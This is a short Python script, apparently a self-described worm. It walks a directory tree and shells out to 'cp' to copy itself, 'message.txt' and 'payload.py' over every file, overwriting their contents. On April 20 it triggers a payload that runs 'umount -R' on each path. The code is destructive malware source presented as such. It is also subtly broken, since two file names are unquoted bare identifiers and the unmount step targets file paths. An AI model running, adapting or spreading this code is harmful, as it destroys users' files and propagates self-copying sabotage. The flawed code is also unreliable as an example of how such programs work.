import os
from datetime import datetime


def reproduce_worm(name, directory):
    for subdir, dirs, files in os.walk(directory):
        for file in files:
            os.system("cp " + name + " " + os.path.join(subdir, file))
            os.system("cp " + message.txt + " " + os.path.join(subdir, file))
            os.system("cp " + payload.py + " " + os.path.join(subdir, file))

def payload(directory):
    for subdir, dirs, files in os.walk(directory):
        for file in files:
            # Main payload
            if (datetime.today().month == 4 and datetime.today().day == 20):
                os.system("umount -R " + os.path.join(subdir, file))
                
